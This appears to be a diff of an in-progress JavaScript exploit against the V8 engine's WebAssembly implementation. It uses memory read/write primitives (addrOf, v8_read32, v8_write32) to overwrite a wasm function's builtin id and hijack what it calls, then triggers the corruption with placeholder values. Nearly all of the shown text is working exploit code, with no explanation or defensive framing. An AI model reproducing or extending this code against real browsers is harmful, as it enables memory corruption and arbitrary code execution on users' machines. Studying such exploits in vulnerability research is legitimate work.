@@ -41,7 +41,7 @@ function foo(idx, value) {
 
 foo(0, 1);
 
-%DebugPrint(foo);
+// %DebugPrint(foo);
 // =================================================================
 const builder = new WasmModuleBuilder();
 builder.exportMemoryAs("mem0", 0);
@@ -59,21 +59,18 @@ builder.addFunction("func0", kSig_v_l).exportFunc().addBody([ // func 0 receive 
   ...wasmI32Const(0x41414141),
   kExprI32StoreMem, 0, 0, // i32.store offset = -1
 ]);
-// builder.addFunction("func1", builder.addType(kSig_l_l)).exportFunc().addBody([ // function 1 convert from int32 to int64
-//   kExprLocalGet, 0,
-// //   kExprI32ConvertI64,
-//   kExprI64Const, 0x81, 0x80, 0x80, 0x80, 0x10,
-//   kExprI64Mul,
-// ]);
 
-let a = Array(2).fill(kWasmI64);
-let $sig_v_a = builder.addType(makeSig([],a)); 
-builder.addFunction("func1", $sig_v_a)
-    .exportFunc()
-    .addBody([
-        kExprI64Const, 0x20,
-        kExprI64Const, 0,
-    ]);
+// =================================================================
+let array = builder.addArray(kWasmI32, true);
+let $sig_array = builder.addType( makeSig([wasmRefNullType(array), kWasmI32], [kWasmI32]));
+let $a0 = builder.addFunction(
+  "func1", makeSig([wasmRefNullType(array), kWasmI32], [kWasmI32]))
+.addBody([kExprLocalGet, 0, kExprLocalGet, 1,
+          kGCPrefix, kExprArrayGet, array])
+.exportFunc();
+
+
+// ===================================================================
 
 let instance = builder.instantiate();
 
@@ -87,26 +84,18 @@ instance.exports.func1(0n);
 let id_builtins_function = Number(v8_read32(addrOf(instance.exports.func1)+0xb+1));
 console.log("0x" + id_builtins_function.toString(16));
 
-// 0xfc - Builtins_MathLog
-//  Command failed with offset 0x4f
-// 0x336: Builtins_FulfillPromise
-// 0x14a6
-// 0x15fc-0x144f
-// 0x12d4
-// 1027
-// 0x2000 -> call jit
-// console.log(arguments[0]);
+
 v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x12d4)*0x200);
 // v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), 0x41414141);
 console.log("0x" + v8_read32(addrOf(instance.exports.func1)+0xb+1).toString(16));
 
 // 
-v8_write32(0x180d35n + 0x27n, 0x41414141);
-v8_write32(0x1816c9n + 3n, 0x400600);
+// v8_write32(0x180d35n + 0x27n, 0x41414141);
+// v8_write32(0x1816c9n + 3n, 0x400600);
 // v8_write64(0x200145n - 1n, 0x4141414142424242n);
 
 // trigger
 // target_page
-foo(1, 0x414141n);
+foo(1, 0x4242n);
 instance.exports.func1(0x4141414141n);
 // instance.exports.func1(123n);
